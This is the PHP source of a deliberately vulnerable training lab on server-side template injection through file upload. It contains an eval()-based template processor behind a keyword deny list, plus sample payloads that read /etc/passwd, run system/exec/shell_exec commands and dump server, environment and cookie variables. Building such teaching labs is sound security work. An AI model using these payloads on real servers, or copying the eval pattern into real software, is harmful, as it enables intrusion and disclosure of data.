<?php
// Lab 3: SSTI via File Upload
// Vulnerability: SSTI attacks through file upload functionality

session_start();

$message = '';
$template_output = '';
$uploaded_files = [];

// Initialize uploaded files if not exists
if (!isset($_SESSION['uploaded_files'])) {
    $_SESSION['uploaded_files'] = [];
}

$uploaded_files = $_SESSION['uploaded_files'];

// Simulate template engine for file processing (vulnerable to SSTI)
function process_uploaded_file($file_content, $file_name) {
    // Vulnerable: Direct processing of file content as template
    $template = $file_content;
    
    // Basic template variables
    $template = str_replace('{{filename}}', $file_name, $template);
    $template = str_replace('{{filesize}}', strlen($file_content), $template);
    $template = str_replace('{{upload_time}}', date('Y-m-d H:i:s'), $template);
    
    // Vulnerable: Direct evaluation of template expressions
    if (preg_match_all('/\{\{([^}]+)\}\}/', $template, $matches)) {
        foreach ($matches[1] as $expression) {
            $expression = trim($expression);
            
            // Check for dangerous expressions
            if (strpos($expression, 'system') !== false || 
                strpos($expression, 'exec') !== false || 
                strpos($expression, 'shell_exec') !== false ||
                strpos($expression, 'passthru') !== false ||
                strpos($expression, 'eval') !== false) {
                return "⚠️ DANGEROUS EXPRESSION DETECTED: " . htmlspecialchars($expression);
            }
            
            // Evaluate mathematical expressions
            if (preg_match('/^[\d\s\+\-\*\/\(\)\.]+$/', $expression)) {
                try {
                    $result = eval("return $expression;");
                    $template = str_replace('{{' . $expression . '}}', $result, $template);
                } catch (Exception $e) {
                    $template = str_replace('{{' . $expression . '}}', 'ERROR', $template);
                }
            }
        }
    }
    
    return $template;
}

// Handle file upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['upload_file'])) {
    $file_content = $_POST['file_content'] ?? '';
    $file_name = $_POST['file_name'] ?? 'uploaded_file.txt';
    $file_type = $_POST['file_type'] ?? 'text/plain';
    
    if ($file_content && $file_name) {
        $file_data = [
            'name' => $file_name,
            'content' => $file_content,
            'type' => $file_type,
            'size' => strlen($file_content),
            'uploaded_at' => date('Y-m-d H:i:s')
        ];
        
        // Process file content as template
        $processed_content = process_uploaded_file($file_content, $file_name);
        
        $file_data['processed_content'] = $processed_content;
        $_SESSION['uploaded_files'][] = $file_data;
        $uploaded_files = $_SESSION['uploaded_files'];
        
        if (strpos($processed_content, '⚠️ DANGEROUS EXPRESSION DETECTED') !== false) {
            $message = '<div class="alert alert-danger">Dangerous expression detected in uploaded file!</div>';
        } else {
            $message = '<div class="alert alert-success">File uploaded and processed successfully!</div>';
        }
    } else {
        $message = '<div class="alert alert-danger">Please provide both file name and content!</div>';
    }
}

// Handle file deletion
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_file'])) {
    $file_index = (int)($_POST['file_index'] ?? -1);
    
    if ($file_index >= 0 && $file_index < count($uploaded_files)) {
        unset($_SESSION['uploaded_files'][$file_index]);
        $_SESSION['uploaded_files'] = array_values($_SESSION['uploaded_files']);
        $uploaded_files = $_SESSION['uploaded_files'];
        $message = '<div class="alert alert-success">File deleted successfully!</div>';
    } else {
        $message = '<div class="alert alert-danger">Invalid file index!</div>';
    }
}

// Handle template rendering from uploaded file
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['render_template'])) {
    $file_index = (int)($_POST['file_index'] ?? -1);
    
    if ($file_index >= 0 && $file_index < count($uploaded_files)) {
        $file = $uploaded_files[$file_index];
        $template_output = process_uploaded_file($file['content'], $file['name']);
        
        if (strpos($template_output, '⚠️ DANGEROUS EXPRESSION DETECTED') !== false) {
            $message = '<div class="alert alert-danger">Dangerous expression detected in template!</div>';
        } else {
            $message = '<div class="alert alert-success">Template rendered successfully!</div>';
        }
    } else {
        $message = '<div class="alert alert-danger">Invalid file index!</div>';
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 3: SSTI via File Upload - SSTI Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .template-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .template-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .file-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to SSTI Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 3: SSTI via File Upload</h1>
            <p class="hero-subtitle">SSTI attacks through file upload functionality</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: Medium</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates SSTI vulnerabilities that can be exploited through file upload functionality. Attackers can upload files containing malicious template code that gets processed and executed on the server.</p>
            <p><strong>Objective:</strong> Upload files containing malicious template code to achieve code execution and information disclosure.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable Code
                    </div>
                    <div class="card-body">
                        <pre>
// Vulnerable: Direct processing of file content as template
function process_uploaded_file($file_content, $file_name) {
    $template = $file_content;
    
    // Basic template variables
    $template = str_replace('{{filename}}', $file_name, $template);
    $template = str_replace('{{filesize}}', strlen($file_content), $template);
    
    // Vulnerable: Direct evaluation of template expressions
    if (preg_match_all('/\{\{([^}]+)\}\}/', $template, $matches)) {
        foreach ($matches[1] as $expression) {
            $expression = trim($expression);
            
            // Evaluate mathematical expressions
            if (preg_match('/^[\d\s\+\-\*\/\(\)\.]+$/', $expression)) {
                $result = eval("return $expression;");
                $template = str_replace('{{' . $expression . '}}', $result, $template);
            }
        }
    }
    
    return $template;
}</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-upload me-2"></i>File Upload
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <form method="POST">
                            <input type="hidden" name="upload_file" value="1">
                            <div class="mb-3">
                                <label for="file_name" class="form-label">File Name</label>
                                <input type="text" class="form-control" id="file_name" name="file_name" 
                                       placeholder="Enter file name...">
                            </div>
                            <div class="mb-3">
                                <label for="file_type" class="form-label">File Type</label>
                                <select class="form-select" id="file_type" name="file_type">
                                    <option value="text/plain">Text File</option>
                                    <option value="text/html">HTML File</option>
                                    <option value="application/x-php">PHP File</option>
                                    <option value="text/template">Template File</option>
                                </select>
                            </div>
                            <div class="mb-3">
                                <label for="file_content" class="form-label">File Content</label>
                                <textarea class="form-control" id="file_content" name="file_content" 
                                          rows="4" placeholder="Enter file content...">File: {{filename}}
Size: {{filesize}} bytes
Uploaded: {{upload_time}}

Math test: {{7*7}}</textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Upload File</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-files me-2"></i>Uploaded Files
                    </div>
                    <div class="card-body">
                        <?php if (empty($uploaded_files)): ?>
                            <p class="text-muted">No files uploaded yet.</p>
                        <?php else: ?>
                            <?php foreach ($uploaded_files as $index => $file): ?>
                                <div class="file-info">
                                    <h5>File <?php echo $index + 1; ?>: <?php echo htmlspecialchars($file['name']); ?></h5>
                                    <p><strong>Type:</strong> <?php echo htmlspecialchars($file['type']); ?></p>
                                    <p><strong>Size:</strong> <?php echo number_format($file['size']); ?> bytes</p>
                                    <p><strong>Uploaded:</strong> <?php echo htmlspecialchars($file['uploaded_at']); ?></p>
                                    
                                    <?php if (isset($file['processed_content'])): ?>
                                        <div class="template-info">
                                            <h6>Processed Content:</h6>
                                            <pre><?php echo htmlspecialchars($file['processed_content']); ?></pre>
                                        </div>
                                    <?php endif; ?>
                                    
                                    <div class="mt-2">
                                        <form method="POST" class="d-inline">
                                            <input type="hidden" name="render_template" value="1">
                                            <input type="hidden" name="file_index" value="<?php echo $index; ?>">
                                            <button type="submit" class="btn btn-sm btn-primary">Render Template</button>
                                        </form>
                                        <form method="POST" class="d-inline">
                                            <input type="hidden" name="delete_file" value="1">
                                            <input type="hidden" name="file_index" value="<?php echo $index; ?>">
                                            <button type="submit" class="btn btn-sm btn-danger">Delete</button>
                                        </form>
                                    </div>
                                </div>
                            <?php endforeach; ?>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
        </div>

        <?php if ($template_output): ?>
        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-slash me-2"></i>Template Output
                    </div>
                    <div class="card-body">
                        <div class="template-display">
                            <h5>Rendered Template</h5>
                            <div class="sensitive-data">
                                <pre><?php echo htmlspecialchars($template_output); ?></pre>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php endif; ?>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> SSTI via File Upload</li>
                        <li><strong>Severity:</strong> High</li>
                        <li><strong>Method:</strong> POST</li>
                        <li><strong>Issue:</strong> Direct processing of file content as template</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>File Upload SSTI Examples</h5>
                    <ul>
                        <li><code>malicious.txt</code> - Basic SSTI payload</li>
                        <li><code>template.html</code> - HTML template with SSTI</li>
                        <li><code>config.php</code> - PHP file with SSTI</li>
                        <li><code>backdoor.tpl</code> - Template file with RCE</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>File Upload SSTI Payloads</h5>
            <p>Upload these files to test SSTI vulnerabilities:</p>
            
            <h6>1. Basic SSTI File (malicious.txt):</h6>
            <div class="code-block">File: {{filename}}
Size: {{filesize}} bytes
Uploaded: {{upload_time}}

Math test: {{7*7}}
Complex math: {{7*7*7}}
With parentheses: {{(7*7)+1}}
Decimal math: {{7.5*2}}</div>

            <h6>2. Information Disclosure File (info.txt):</h6>
            <div class="code-block">File: {{filename}}
Size: {{filesize}} bytes
Uploaded: {{upload_time}}

System info: {{phpinfo()}}
Current time: {{date('Y-m-d H:i:s')}}
Server name: {{$_SERVER['SERVER_NAME']}}
PHP version: {{phpversion()}}
Current directory: {{getcwd()}}</div>

            <h6>3. File System Access File (filesystem.txt):</h6>
            <div class="code-block">File: {{filename}}
Size: {{filesize}} bytes
Uploaded: {{upload_time}}

File contents: {{file_get_contents('/etc/passwd')}}
Directory listing: {{scandir('/')}}
File exists: {{file_exists('/etc/passwd')}}
Is directory: {{is_dir('/etc')}}
Is file: {{is_file('/etc/passwd')}}</div>

            <h6>4. Command Execution File (rce.txt):</h6>
            <div class="code-block">File: {{filename}}
Size: {{filesize}} bytes
Uploaded: {{upload_time}}

System command: {{system('whoami')}}
Execute command: {{exec('id')}}
Shell command: {{shell_exec('uname -a')}}
Pass through: {{passthru('ls -la')}}
Eval command: {{eval('echo "Hacked!";')}}</div>

            <h6>5. Advanced SSTI File (advanced.txt):</h6>
            <div class="code-block">File: {{filename}}
Size: {{filesize}} bytes
Uploaded: {{upload_time}}

Environment variables: {{$_ENV}}
Server variables: {{$_SERVER}}
Get variables: {{$_GET}}
Post variables: {{$_POST}}
Session variables: {{$_SESSION}}
Cookie variables: {{$_COOKIE}}</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Upload malicious files containing SSTI payloads</li>
                <li>Execute arbitrary code through file processing</li>
                <li>Access sensitive files and directories</li>
                <li>Bypass file upload restrictions and filters</li>
                <li>Compromise server through file upload functionality</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement proper file upload validation and sanitization</li>
                    <li>Use safe template engines that prevent code execution</li>
                    <li>Implement file type restrictions and content validation</li>
                    <li>Use sandboxed environments for file processing</li>
                    <li>Implement proper access controls and permissions</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual file upload patterns and content</li>
                </ul>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
